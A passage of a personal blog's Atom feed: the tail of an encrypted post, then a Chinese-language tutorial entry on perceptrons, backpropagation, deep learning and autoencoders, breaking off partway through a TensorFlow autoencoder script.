a763730dd4694bbd28c0840828a8d11f6462cf14ac1803f5f3378a6bc6bec01a71bc61dff4366c44462ec416ee45a499ad71832405c5280f5458dde353b17bd2dfe0d8adddf63071acabc190cf1df53ad112a5dd52def422089f6b22d587536a43d8e999df702f3b686093dbe2e9caf9c64d2e0f1d6028f2a197c4749306a64c6387d42dfbc2bf7093a0769fa3ee3b1ec9679db8e62dbfef0309bb66692160c184098dc5a234e5076902e1645d31a68c0b8ad2c6dc262d54d53dc4e254f10690bef06f0fd363fde2294f34009b69b9ba89d78ceba1387be99df61b1dd93769f9bb823e86d4b6ad511de705b06009d883cfc6f561a027b17de4372aacc4641c727807655b69ce143c9b5daa284e44ce27031f606155d389d7dfd3587deeb19d9d5a232f018fd8f6e8849a98fed0c5e21d78ade1ceb22015a575b57f600f426dd2cb313d68a3545f570f4a97af27a739b6437be93afe85f5212364f124190ba7d33c7a3b4ae5def0466e1ce06d85e44297b314fd3cea8b65f049bfa5f58efcaa2c3e080a7b2b5c0a2c8c5d8c8d48391e604000c70983a7afe9a125df3d6d9f40d479bfe32d1b31b425ebd53a8a40c5f86f9d1e4b05390753ae31d37b56c0abd572c7772d9475abc449b775ba2639558a90de66e9e87a3164a60dc14f4037a18ae17309af6b75b71ad524e8d4f3a953efbad782b9d4043f38c7a49c2e448595cfb0282f42ada8df046b18d69b4db2db3d4ff14c3d7b4c7879201bab73d4b557c8e40027969b1d165be952e16dbf00d8f8603c4792b74755e9a3b4fcbd73d848f7d13520445b09aaf8d5bbdae0fe608a262035d824ec20fd41758f71a3e261b882ac48d567e89f9ba4d717cf399ddd27763bc3465242856d1f935683fcf99cf26beb265d43d4bfd6255893effd082b47bdac3b42e756670ad0aab520b257891610a43128efc5dc7dee4a70b490c4f61627325f471367d9c5da298c183d71c63824ee4665a4cad2e43a37a9efd8b00ba9c32e91f7eff3c80772ad7c8288af03735befa91d04a5c01151fdcda93dc850a6920651d880ef15a2061ca87b29b6b0bbd985bff927493840aec2a4ba472cd9282c54171f2c801b3f11c00d5d1ece01e85d840f19dd0afa62c61c7d3c127a3e2e0dd4326d62f4ddf8df3dded0b0901d489735ac1c083ef23b231b7679496e07bdfdd401e30e0b065cc0a4b2bd98af53c30dc76995a330c459abf2d1a1d1210aa5d3999b7d034e93aadd5b1a94b48a798ed669e3b9285081badc4e5497be8a4e2cf08e0a04b9b35718b59b1ee0b2280291522e7a5d47733303da68f6862559b063f169e2f3f6da3653030147c22b47f4dd413b3abf4cc4728d5c850387346d4d257e7778363dfb0597ee22b14ce7e8d12d7527a80621d95e0ea8a1324495a8f9c7fac180a75af4389ef969dbd5f22ba75d6547ab1b3821653db4a065a6ebc939d67cca956fd9ed256fad79ab5fcd73295a7cec858256d87a63d91de6b7b766c53ed8659005e8ce2d5fda10a2bad97f488857c58855bf2ae0515fb838899e7915bef6c9d7ebc9b1d2a8762e931a6f36c273fab763fa48f3e4369b4b827b8107845d22c63ed6a336df19d0a2eafb4d468409230594436f6a62e3f54cf38cb25895a8a4da0cb19bf28d07da2c68a4325c926ee5ca5831d665ef886cab4828ac7017260850a92a21d98c459c42111a79f4380cda590397334f7f8547c8534359a7ce14516b5739c096077add84a7c3d96ba681f453e03df3f5a6210b8cb10e2f1a51fb5141b64c69db8f3660a86f5c1a935515cc56cf9f1ce6d9e529ba9a4aadae657eecd63797afd9e168040ce76e8b48fbd7658b9b538b112e50d2ee8ee574f0aa9a8a00d797c4ec6763d0cb3efad47e3cf8652f15dd50b55b6557845c5216afbbb10f386cca9e4b3fa5410c480fd8cb8cf49bc67dc732b1b82f6b77bda5e22f17035f55fbbc9b93f91899c7bffff53f74535c3e1aaf3ffa67588cb53fe5036de657586f301a85315c6a8eacf0e8f2136de50d677db1a7f020905852314135900454cefd7abc9e964abfe29066f83e066d742885cc041bf9da9e226cff197ed3c90dccc724b0788507134b86f41c8c88b2ffee58792df375acdc44b8d85be7ac2a88a359ff1a0ff685098c3b6b0630c9f6c8bcf8b76fea9a557b5270c5a08c2623177adf04ae497fb334ab946a2434121efb9d9a2095d1165023e37ccfbd8f89bc4ae5795bc9227dcd07a979a5e44d0e09fd5f446c45c77712dd3f562778be252d325ffa4f73e9607ccd134c1706371f95a4daccaa245282bcd8906ecfe377eb86f794d40069c65bd90433cbfcd1178357ab72834bedad7b7abd893c11d84ba8c992f92d5c8bbc3247697ae63fd62eae8cd98b979df7c99f99a066897c478689dff635bd1b5f7dd43424f71affbf35097e9168bc445de595d865211b8f422a0127f5cdbca8eae7b9ee46de5b3f9c4693a504bb9d8315b02fbc0b429e08d7eba43e6dad22d0281e1abb4d47878562f6520f25c1a226fe85ba75658a3633499c89a6955e121e67beb5c4e4b30ffe1dbcd672da246dd18b77a6012190410c267bc5b93d8e16cef6f31ba7c7933aaf6177d2e07</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Sorry, the article is encrypted.
    
    </summary>
    
    
    
      <category term="ics" scheme="blog.b3ale.cn/tags/ics/"/>
    
      <category term="rpi" scheme="blog.b3ale.cn/tags/rpi/"/>
    
  </entry>
  
  <entry>
    <title>ANN &amp; Deep Learning</title>
    <link href="blog.b3ale.cn/2020/07/13/ANN-Deep-Learning/"/>
    <id>blog.b3ale.cn/2020/07/13/ANN-Deep-Learning/</id>
    <published>2020-07-13T00:18:55.000Z</published>
    <updated>2020-07-19T02:04:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>人工神经网络和深度学习入门。</p><a id="more"></a><h1 id="Artificial-Neural-Network"><a href="#Artificial-Neural-Network" class="headerlink" title="Artificial Neural Network"></a>Artificial Neural Network</h1><p>人工神经网络（英语：Artificial Neural Network，ANN），简称神经网络（Neural Network，NN）或类神经网络，在机器学习和认知科学领域，是一种模仿生物神经网络（动物的中枢神经系统，特别是大脑）的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。</p><h2 id="History-of-ANN"><a href="#History-of-ANN" class="headerlink" title="History of ANN"></a>History of ANN</h2><p>1943 年，心理学家 W.S.McCulloch 和数理逻辑学家 W.Pitts 基于神经元的生理特征，建立了单个神经元的数学模型（MP 模型）。</p><p><img src="/pics/ANN-Deep-Learning/1.png" srcset="/img/loading.gif" alt></p><p>对应的数学模型：</p><p>$$<br>y_k=\phi(\sum_{i=1}^m\omega_{ki}x_i+b_k)=\phi(\omega_k^Tx+b)<br>$$</p><h2 id="感知器算法（Perceptron-Algorithm）"><a href="#感知器算法（Perceptron-Algorithm）" class="headerlink" title="感知器算法（Perceptron Algorithm）"></a>感知器算法（Perceptron Algorithm）</h2><p>1957 年，Frank Rosenblatt 从纯数学的角度重新考察这一模型，指出能够从一些输入输出对 $(x,y)$ 中通过学习算法获得权重 $\omega$ 和 $b$。输入 $\{(x_i,y_i)\}_{i=1\sim N}$：</p><ol><li>随机选择 $\omega$ 和 $b$；</li><li>循环：取一个训练样本 $(x,y)$；<ol><li>若 $\omega^T+b&gt;0$ 且 $y=-1$，则：$\omega=\omega-x$、$b=b-1$；</li><li>若 $\omega^T+b&lt;0$ 且 $y=+1$，则：$\omega=\omega+x$、$b=b+1$。</li></ol></li><li>终止条件：直到所有输入输出都不满足 2 中的两个条件之一，退出循环。</li></ol><p>$$<br>\begin{array}{l}<br>\omega_{新}^Tx+b_{新}=(\omega-x)^Tx+(b-1)\\<br>=(\omega^T+b)-(\lVert x\rVert^2+1)\\<br>≤(\omega^T+b)-1<br>\end{array}<br>$$</p><p>证明：</p><ul><li>定义一个增广向量 $\vec{x}$；<ol><li>若 $y=+1$，则 $\vec{x}=\begin{bmatrix}x\\ 1\end{bmatrix}$；</li><li>若 $y=-1$，则 $\vec{x}=\begin{bmatrix}-x\\ -1\end{bmatrix}$。</li></ol></li><li>定义增广 $\omega=\begin{bmatrix}\omega\\ b\end{bmatrix}$。感知器算法定义可简化为输入 $\vec{x_i}$：<ol><li>随机取 $\omega$；</li><li>循环：取一个 $\vec{x_i}$，若 $\omega^T\vec{x_i}&lt;0$，则 $\omega=\omega+\vec{x_i}$；</li><li>终止条件：直到所有输入输出都不满足 2 中的条件，退出循环。</li></ol></li></ul><h3 id="感知器算法的收敛定理"><a href="#感知器算法的收敛定理" class="headerlink" title="感知器算法的收敛定理"></a>感知器算法的收敛定理</h3><p>输入 $\{\vec{x_i}\}_{i=1\sim N}$，若线性可分，即存在 $\omega_{opt}$，使：$\omega_{opt}^T\vec{x_i}&gt;0(i=1\sim N)$，则利用上述感知器算法，经过有限步后，得到一个 $\omega$，使 $\omega^T\vec{x_i}&gt;0(i=1\sim N)$。（$\omega$ 和 $\omega_{opt}$ 存在很小的概率相等）</p><p>证：不失一般性，设 $\lVert\omega_{opt}\rVert=1$（因为 $\omega_{opt}$ 与 $a\omega_{opt}(a&gt;0)$ 是同一平面）。假设第 $k$ 步的 $\omega$ 是 $\omega(k)$，且有一个 $\vec{x_i}$，使 $\omega(k)^T\vec{x_i}&lt;0$，根据感知器算法：</p><p>$$<br>\begin{array}{l}<br>\omega(k+1)=\omega(k)+\vec{x_i}\\<br>\omega(k+1)-a\omega_{opt}=\omega(k)+\vec{x_i}-a\omega_{opt}\\<br>\lVert\omega(k+1)-a\omega_{opt}\rVert^2=\lVert\omega(k)+\vec{x_i}-a\omega_{opt}\rVert^2\\<br>=\lVert\omega(k)-a\omega_{opt}+\vec{x_i}\rVert^2\\<br>=\lVert\omega(k)-a\omega_{opt}\rVert^2+\lVert\vec{x_i}\rVert^2+2\omega(k)^T\vec{x_i}-2a\omega_{opt}^T\vec{x_i}<br>\end{array}<br>$$</p><p>一定可以取到很大的 $a$，使 $\lVert\omega(k+1)-a\omega_{opt}\rVert^2&lt;\lVert\omega(k)-a\omega_{opt}\rVert^2$。</p><p>定义：$\beta=\max_{i\sim N}\{\lVert\vec{x_i}\rVert\}$、$\gamma=\min_{i=1\sim N}(\omega_{opt}^Tx_i)$，取 $a=\frac{\beta^2+1}{2\gamma}$，则 $\lVert\omega(k+1)-a\omega_{opt}\rVert^2&lt;\lVert\omega(k)-a\omega_{opt}\rVert^2-1$。</p><p>取 $D=\lVert\omega(0)-a\omega_{opt}\rVert$，则至多经过 $D^2$ 步，$\omega$ 将会收敛至 $a\omega_{opt}$。</p><p>$$<br>\begin{array}{l}<br>D^2=\lVert\omega(0)-a\omega_{opt}\rVert^2\\<br>=\lVert\omega(0)\rVert^2+a^2\lVert\omega_{opt}\rVert^2-2a\omega(0)^T\omega_{opt}\\<br>=\lVert\omega(0)\rVert^2+a^2\lVert\omega_{opt}\rVert^2-2a\lVert\omega(0)\rVert\lVert\omega_{opt}\rVert\cos\theta\\<br>≤\lVert\omega(0)\rVert^2+a^2+2a\lVert\omega(0)\rVert<br>\end{array}<br>$$</p><h2 id="人工智能的第一次冬天"><a href="#人工智能的第一次冬天" class="headerlink" title="人工智能的第一次冬天"></a>人工智能的第一次冬天</h2><p>Minsky 创造了线性可分（不可分）的概念（1969，《Perceptron》），提出日常生活中很多分类问题都是非线性可分的。</p><p>例：识别一个二值图像是否全连通。</p><h2 id="多层神经网络（Multiple-layer-Neural-Network）"><a href="#多层神经网络（Multiple-layer-Neural-Network）" class="headerlink" title="多层神经网络（Multiple-layer Neural Network）"></a>多层神经网络（Multiple-layer Neural Network）</h2><p>多层神经网络（多层前馈神经网络，Multi-layer Feedforward Neural Network）的出现让解决非线性可分的问题成为可能。</p><h3 id="二层神经网络"><a href="#二层神经网络" class="headerlink" title="二层神经网络"></a>二层神经网络</h3><p>给出输入数据 $x=\begin{bmatrix}x_1\\ x_2\end{bmatrix}$，有二层神经网络如下：</p><p><img src="/pics/ANN-Deep-Learning/2.png" srcset="/img/loading.gif" alt></p><p>其中 $\phi(\cdot)$ 是一个非线性函数。</p><p>$$<br>\begin{cases}<br>a_1=\omega_{11}x_1+\omega_{12}x_2+b_1\\<br>a_2=\omega_{21}x_1+\omega_{22}x_x+b_2\\<br>z_1=\phi(a_1)\\<br>z_2=\phi(a_2)\\<br>y=\omega_1z_1+\omega_2z_2+b<br>\end{cases}<br>$$</p><p>即 $y=\omega_1\phi(\omega_{11}x_1+\omega_{12}x_2+b_1)+\omega_2\phi(\omega_{21}x_1+\omega_{22}x_2+b_2)+b$。若 $\phi(\cdot)$ 不做映射，可以证明与单个神经元模型完全相同：</p><p>$$<br>\begin{array}{l}<br>y=\omega_1(\omega_{11}x_1+\omega_{12}x_2+b_1)+\omega_2(\omega_{21}x_1+\omega_{22}x_2+b_2)+b\\<br>=(\omega_1\omega_{11}+\omega_2\omega_{21})x_1+(\omega_1\omega_{12}+\omega_2\omega_{22})x_2+(\omega_1b_1+\omega_2b_2+b)<br>\end{array}<br>$$</p><p>故必须包含非线性函数 $\phi(\cdot)$，才能构成一个非线性问题。非线性函数 $\phi(x)$ 一般取阶跃函数或 Sigmoid 函数：</p><p><img src="/pics/ANN-Deep-Learning/3.png" srcset="/img/loading.gif" alt></p><p>阶跃函数可以被证明能够处理所有非线性问题。</p><h3 id="三层神经网络"><a href="#三层神经网络" class="headerlink" title="三层神经网络"></a>三层神经网络</h3><p>定理：三层神经网络可以模拟所有决策面。假设有以下非线性问题，灰色部分设为 $C_1$，其他部分设为 $C_2$：</p><p><img src="/pics/ANN-Deep-Learning/4.png" srcset="/img/loading.gif" alt></p><p>根据二层神经网络，构造如下三层神经网络：</p><p><img src="/pics/ANN-Deep-Learning/5.png" srcset="/img/loading.gif" alt></p><h2 id="后向传播算法（Back-Propagation，误差逆传播）"><a href="#后向传播算法（Back-Propagation，误差逆传播）" class="headerlink" title="后向传播算法（Back Propagation，误差逆传播）"></a>后向传播算法（Back Propagation，误差逆传播）</h2><p>针对上面的的二层神经网络，进行梯度下降法求局部极值（Gradient Descent Method）：</p><ol><li>找一个 $\omega_0$；</li><li>设 $k=0$，假设 $\frac{d f(\omega)}{d\omega}\vert_{\omega_k}=0$，退出。否则，$\omega_{k+1}=\omega_k-\alpha\frac{d f(\omega)}{d\omega}\vert_{\omega_k}$，其中 $\alpha&gt;0$ 是学习率。</li></ol><p>$$<br>\begin{array}{l}<br>f(\omega+\Delta\omega)=f(\omega)+\frac{d f(\omega)}{d\omega}\vert_\omega\cdot\Delta\omega+o(\Delta\omega)\\<br>f(\omega_{k+1})=f(\omega_k)+(\frac{d f(\omega)}{d\omega}\vert_{\omega_k})\cdot(-\alpha\frac{d f(\omega)}{d\omega}\vert_{\omega_k})\\<br>=f(\omega_k)-\alpha[\frac{d f(\omega)}{d\omega}\vert_{\omega_k}]^2+o(\Delta\omega)≤f(\omega_k)<br>\end{array}<br>$$</p><p>输入 $\{(x_i,Y_i)\}_{i=1\sim N}$。针对输入 $(X,Y)$，有 $E=\frac{1}{2}(y-Y)^2$（MSE，Mean Score Error）。推导过程：</p><ol><li>随机取变量（$\omega_{11}$、$\omega_{12}$、$\omega_{21}$、$\omega_{22}$、$b_1$、$b_2$、$\omega_1$、$\omega_2$、$b$）；</li><li>对所有的 $\omega$，求 $\frac{\partial E}{\partial\omega}$；对所有的 $b$，求 $\frac{\partial E}{\partial b}$；</li><li>有 $\omega^{(新)}=\omega^{(旧)}-\alpha\frac{\partial E}{\partial\omega}\vert_{\omega^{(旧)}}$，$b^{(新)}=b^{(旧)}-\alpha\frac{\partial E}{\partial b}\vert_{b^{(旧)}}$；</li><li>当所有 $\frac{\partial E}{\partial\omega}$ 与 $\frac{\partial E}{\partial b}$ 都为 0 时，退出。</li></ol><p>根据上面的式子计算所有偏导数的过程：</p><p>$$<br>\begin{array}{l}<br>\frac{dE}{dy}=(y-Y)\\<br>\frac{\partial E}{\partial a_1}=\frac{dE}{dy}\frac{\partial y}{\partial z_1}\frac{dz_1}{da_1}=(y-Y)\omega_1\phi’(a_1)\\<br>\frac{\partial E}{\partial a_2}=\frac{dE}{dy}\frac{\partial y}{\partial z_2}\frac{dz_2}{da_2}=(y-Y)\omega_2\phi’(a_2)\\<br>\frac{\partial E}{\partial b}=\frac{dE}{dy}\frac{\partial y}{\partial b}=(y-Y)\\<br>\frac{\partial E}{\partial\omega_1}=\frac{dE}{dy}\frac{\partial y}{\partial\omega_1}=(y-Y)z_1\\<br>\frac{\partial E}{\partial\omega_2}=\frac{dE}{dy}\frac{\partial y}{\partial\omega_2}=(y-Y)z_2\\<br>\frac{\partial E}{\partial\omega_{11}}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial\omega_{11}}=(y-Y)\omega_1\phi’(a_1)x_1\\<br>\frac{\partial E}{\partial\omega_{12}}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial\omega_{12}}=(y-Y)\omega_1\phi’(a_1)x_2\\<br>\frac{\partial E}{\partial b_1}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial b_1}=(y-Y)\omega_1\phi’(a_1)\\<br>\frac{\partial E}{\partial\omega_{21}}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial\omega_{21}}=(y-Y)\omega_1\phi’(a_2)x_1\\<br>\frac{\partial E}{\partial\omega_{22}}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial\omega_{22}}=(y-Y)\omega_1\phi’(a_2)x_2\\<br>\frac{\partial E}{\partial b_2}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial b_2}=(y-Y)\omega_2\phi’(a_2)<br>\end{array}<br>$$</p><p>$\phi(x)$ 不能取阶跃函数，因为阶跃函数中除了 $x=0$ 时，其他地方 $\phi’(x)=0$，导致不能进行后向传播。BP 神经网络中通常采用如下的函数：</p><ul><li>Sigmoid 函数：$\phi(x)=\frac{1}{1+e^{-x}}$；<ul><li>$\phi’(x)=\phi(x)[1-\phi(x)]$。</li></ul></li><li>双曲正切函数：$\phi(x)=\tanh(x)=\frac{e^x-e^{-x}}{e^x+e^{-x}}$；<ul><li>$\phi’(x)=1-[\phi(x)]^2$。</li></ul></li><li>线性整流函数（Rectified Linear Units）：$\phi(x)=ReLu(x)=\begin{cases}x,x&gt;0\\ 0,x≤0\end{cases}=\max(0,x)$；<ul><li>$\phi’(x)=\begin{cases}1,x&gt;0\\ 0,x≤0\end{cases}$。</li></ul></li><li>带泄漏的线性整流函数（Leak ReLu）：$\phi(x)=\begin{cases}x,x&gt;0\\ \beta x,x≤0\end{cases}$。<ul><li>$\phi’(x)=\begin{cases}1,x&gt;0\\ \beta,x≤0\end{cases}$。</li></ul></li></ul><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>将 BP 算法放在一个更具有普适性的情况下实现。定义：</p><ol><li>网络共 $l$ 层；</li><li>$z^{(k)}$、$a^{(k)}$、$b^{(k)}$ 是第 $k$ 层的向量，与第 $k$ 层神经元个数一致；</li><li>$z_i^{(k)}$、$a_i^{(k)}$、$b_i^{(k)}$ 表示 $z^{(k)}$、$a^{(k)}$、$b^{(k)}$ 的第 $i$ 个分量；</li><li>用 $y_i$ 表示 $y$ 的第 $i$ 个分量。</li></ol><p><img src="/pics/ANN-Deep-Learning/6.jpg" srcset="/img/loading.gif" alt></p><p>求偏导的过程如下。设 $\delta_i^{(m)}=\frac{\partial E}{\partial z_i^{(m)}}$：</p><ol><li>$\delta_i^{(l)}=\frac{\partial E}{\partial z_i^{(l)}}=\frac{\partial E}{\partial y_i}\frac{\partial y_i}{\partial z_i^{(l)}}=(y_i-Y_i)\phi’(z_i^{(l)})$；</li><li>$\delta_i^{(m)}=\frac{\partial E}{\partial z_i^{(m)}}=\frac{\partial E}{\partial a_i^{(m)}}\frac{\partial a_i^{(m)}}{\partial z_i^{(m)}}=\phi(z_i^{(m)})’(\sum_{j=1}^{S_{m+1}}\delta_j^{(m+1)}\omega_{ji})$，其中 $S_m$ 为第 $m$ 层上 $z$ 的个数且 $1≤m≤(l-1)$；</li><li>$\begin{cases}\frac{\partial E}{\partial\omega_{ij}^{(m)}}=\delta_j^{(m)}a_i^{(m-1)}\\ \frac{\partial E}{\partial b_i^{(m)}}=\delta_i^{(m)}\end{cases}$；</li></ol><p>BP 算法流程：</p><ol><li>随机初始化 $(\omega,b)$；</li><li>训练样本 $(X,Y)$ 代入网络，可求出所有的 $(z,a,y)$（前向计算）；</li><li>链式法则求偏导。最小化 $E=\frac{1}{2}\lVert y-Y\rVert^2=\frac{1}{2}\sum_{i=1}^M(y_i-Y_i)^2$，求 $\frac{\partial E}{\partial\omega},\frac{\partial E}{\partial b}$（后向传播）；</li><li>更新参数：$\omega^{(新)}=\omega^{(旧)}-\alpha\frac{\partial E}{\partial\omega}\vert_{\omega^{(旧)}}$，$b^{(新)}=b^{(旧)}-\alpha\frac{\partial E}{\partial b}\vert_{b^{(旧)}}$。</li></ol><h3 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h3><p>参数设置：</p><ol><li>随机梯度下降（Stochastic Gradient Descent，SGD）；<ul><li>不用每输入一个样本就去变换参数，而是输入一批样本（一个 BATCH 或 MINI-BATCH），求出这些样本的梯度平均值后，根据这个平均值改变参数。</li></ul></li><li>激活函数选择；<ul><li>Sigmoid、tanh、ReLU、Leaky ReLU、Maxout、ELU。</li></ul></li><li>训练数据初始化；<ul><li>做均值和方差的归一化：$newX=\frac{X-mean(X)}{std(X)}$。</li></ul></li><li>$(\omega,b)$ 的初始化；<ul><li>梯度消失现象：如果 $\omega^Tx+b$ 一开始很大或很小，那么梯度将趋近于 0，反向传播后前面与之相关的梯度也趋近于 0，导致训练缓慢。因此，要使 $\omega^Tx+b$ 一开始就在 0 附近；</li><li>一种简单有效的方法：$(\omega,b)$ 初始化从区间 $(-\frac{1}{\sqrt{d}},\frac{1}{\sqrt{d}})$ 均匀随机取值。其中 $d$ 为 $(\omega,b)$ 所在层的神经元个数。可以证明，如果 $x$ 服从正态分布，均值 0，方差 1，且各个维度无关，而 $(\omega,b)$ 是 $(-\frac{1}{\sqrt{d}},\frac{1}{\sqrt{d}})$ 的均匀分布，则 $\omega^Tx+b$ 是均值为 0，方差为 $\frac{1}{3}$ 的正态分布。</li></ul></li><li><a href="http://proceedings.mlr.press/v37/ioffe15.pdf" target="_blank" rel="noopener">Batch Normalization</a>；<ul><li>既然希望每一层获得的值都在 0 附近，从而避免梯度消失现象，那么为什么不直接把每一层的值做基于均值和方差的归一化？</li><li>每一层 FC（Fully Connected Layer）接一个 BN（Batch Normalization）；</li><li>$\hat{x}^{(k)}=\frac{x^{(k)}-E[x^{(k)}]}{\sqrt{Var[x^{(k)}]}}$。</li></ul></li><li>目标函数选择；<ul><li>可加正则项（Regulation Term）：$\begin{array}{l}L(\omega)=F(\omega)+R(\omega)\\ =\frac{1}{2}(\sum_{i=1}^{batch_size}\lVert y_i-Y_i\rVert^2+\beta\sum_k\sum_l\omega_{k,l}^2)\end{array}$；</li><li>如果是分类问题，$F(\omega)$ 可以采用 SOFTMAX 函数和交叉熵的组合；<ul><li>SOFTMAX 函数（归一化指数函数）：$q_i=\frac{e^{z_i}}{\sum_{j=1}^Ne^{z_j}}$；</li><li>交叉熵（Cross Entropy）：$E=-\sum_{i=1}^Np_i\log(q_i)$；</li><li>如果 $F(\omega)$ 是 SOFTMAX 函数和交叉熵的组合，那么求导的形式为 $\frac{\partial E}{\partial z_i}=q_i-p_i$。</li></ul></li></ul></li><li>参数更新策略。<ul><li>SGD 的问题；<ol><li>$(\omega,b)$ 的每一个分量获得的梯度绝对值有大有小，一些情况下，将会迫使优化路径变成 Z 字形状；</li><li>SGD 求梯度的策略过于随机，由于上一次和下一次用的是完全不同的 BATCH 数据，将会出现优化的方向随机的情况；</li></ol></li><li>解决各个方向梯度不一致的方法；<ul><li>AdaFrad；</li><li>RMSProp。</li></ul></li><li>解决梯度随机性的问题；<ul><li>Momentum。</li></ul></li><li>同时解决两个问题。<ul><li>Adam。</li></ul></li></ul></li></ol><p>训练建议：</p><ol><li>一般情况下，在训练集上的目标函数的平均值（Cost）会随着训练的深入而不断减小，如果这个指标有增大的情况，停下来。有两种情况：第一是采用的模型不够复杂，以致于不能在训练集上完全拟合；第二是已经训练很好了；</li><li>分出一些验证集（Validation Set），训练的本质是在验证集上获取最大的识别率。因此训练一段时间后，必须在验证集上测试识别率，保存使验证集在识别率最大的模型参数，作为最后结果；</li><li>注意调整学习率（Learning Rate），如果刚训练几步 Cost 就增加，一般来说是学习率太高了；如果每次 Cost 变化很小，说明学习率太低；</li><li>Batch Normalization 比较好用，对学习率、参数更新策略等不敏感。如果采用其他方法，合理变换各种参数组合也可以达到目的；</li><li>由于梯度累积效应，AdaGrad、RMSProp、Adam 三种更新策略到了训练后期会很慢，可以通过提高学习率来补偿。</li></ol><h1 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h1><p>深度学习是机器学习的分支，是一种以人工神经网络为架构，对数据进行表征学习的算法。</p><h2 id="从多层神经网络说起"><a href="#从多层神经网络说起" class="headerlink" title="从多层神经网络说起"></a>从多层神经网络说起</h2><p>多层神经网络的优势：</p><ol><li>基本单元简单，多个基本单元可扩展为非常复杂的非线性函数。因此易于构建，同时模型有很强的表达能力；</li><li>训练和测试的计算并行性非常好，有利于在分布式系统上的应用；</li><li>模型构建来源于对人脑的仿生，话题丰富，各种领域的研究人员都有兴趣，都能做贡献。</li></ol><p>多层神经网络的劣势：</p><ol><li>数学不漂亮，优化算法只能获得局部极值，算法性能与初始值有关；</li><li>不可解释。训练神经网络获得的参数与实际任务的关联性非常模糊；</li><li>模型可调整的参数很多（网络层数、每层神经元的个数、非线性函数、学习率、优化方法、终止条件等等），使得训练神经网络变成了一门“艺术”；</li><li>如果要训练相对复杂的网络，需要大量的训练样本。</li></ol><h2 id="数据库介绍"><a href="#数据库介绍" class="headerlink" title="数据库介绍"></a>数据库介绍</h2><h3 id="Mnist"><a href="#Mnist" class="headerlink" title="Mnist"></a>Mnist</h3><p>手写数字数据库（LeCun 在 1998 年创造）：</p><ol><li>手写数字 0-9 共 10 类；</li><li>训练样本 60000 个，测试样本 10000 个；</li><li>图像大小 28*28 二值图像。</li></ol><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>Fei-fei Li 等在 2007 年创造：</p><ol><li>1000 类，100 多万张（2009 年的规模）；</li><li>图片大小：正常图片大学，像素几百*几百；</li><li>WORDNET 结构，拥有多个 Node（节点）。一个 Node（目前）含有至少 500 个对应物体的可供训练的图片/图像。</li></ol><h2 id="自编码器（Auto-Encoder）"><a href="#自编码器（Auto-Encoder）" class="headerlink" title="自编码器（Auto Encoder）"></a>自编码器（Auto Encoder）</h2><p>2003 年，人工神经网络进入了沉寂期，因为在样本量少的情况下人工神经网络相对于 SVM 等算法几乎没有优势。自编码器算法为人工神经网络带来了转机和并促进了深度学习的出现。</p><p>自编码器是一种利用 BP 算法使得输入值等于输出值的神经网络，部分解决了 $(\omega,b)$ 参数初始化问题。从本质上来讲，自编码器是一种数据压缩算法，其压缩和解压缩算法都是通过神经网络来实现的。例如训练如下网络：</p><p><img src="/pics/ANN-Deep-Learning/7.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 1：先训练这个网络；</li></ul><p><img src="/pics/ANN-Deep-Learning/8.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 2：定义一个自编码器，使第一层的输入和输出都是 $X$。训练好第 1 层后，接着训练第 2 层（固定第一层参数不动）；</li></ul><p><img src="/pics/ANN-Deep-Learning/9.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 M：以此类推，训练好第 M-1 层后，接着训练第 M 层（固定第 M-1 层参数不动）；</li></ul><p><img src="/pics/ANN-Deep-Learning/10.png" srcset="/img/loading.gif" alt></p><ul><li>最后用 BP 对网络进行微调。</li></ul><p><img src="/pics/ANN-Deep-Learning/11.png" srcset="/img/loading.gif" alt></p><h3 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h3><p>这里用 Python 下的 TensorFlow 库实现自编码器。使用 MNIST 数据集进行训练和测试：</p><pre><code class="python">#!/usr/bin/env python3import tensorflow.compat.v1 as tftf.disable_v2_behavior()import numpy as npimport matplotlib.pyplot as plt# Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&#39;/tmp/data/&#39;, one_hot=False)# Visualize decoder setting# ParameterslearningRate = 0.01 # 学习率为0.01trainingEpochs = 5 # 训练5组batchSize = 256 # 一组Batch共256个数据examplesToShow = 10 # 展示10个样例# Network ParametersnInput = 784 # MNIST data input (img shape: 28 * 28)# tf Graph input (only pictures)X = tf.placeholder(&#39;float&#39;, [None, nInput])# hidden layer settingsnHidden1 = 256 # 1st layer num featuresnHidden2 = 128 # 2nd layer num featuresweights = { # 权重w    &#39;encoderH1&#39;: tf.Variable(tf.random_normal([nInput, nHidden1])),    &#39;encoderH2&#39;: tf.Variable(tf.random_normal([nHidden1, nHidden2])),    &#39;decoderH1&#39;: tf.Variable(tf.random_normal([nHidden2, nHidden1])),    &#39;decoderH2&#39;: tf.Variable(tf.random_normal([nHidden1, nInput])),}biases = { # 偏置b    &#39;encoderB1&#39;: tf.Variable(tf.random_normal([nHidden1])),    &#39;encoderB2&#39;: tf.Variable(tf.random_normal([nHidden2])),    &#39;decoderB1&#39;: tf.Variable(tf.random_normal([nHidden1])),    &#39;decoderB2&#39;: tf.Variable(tf.random_normal([nInput])),}# Building the encoderdef encoder(x):    # Encoder Hidden layer with sigmoid activation # 1    layer1 = tf.nn.sigmoid(tf.add(tf.matmul(x, weights[&#39;encoderH1&#39;]), biases[&#39;encoderB1&#39;]))    # Decoder Hidden layer with sigmoid activation # 2    layer2 = tf.nn.sigmoid(tf.add(tf.matmul(layer1, weights[&#39;encoderH2&#39;]), biases[&#39;encoderB2&#39;]))    return layer2# Building the decoderdef decoder(x):    # 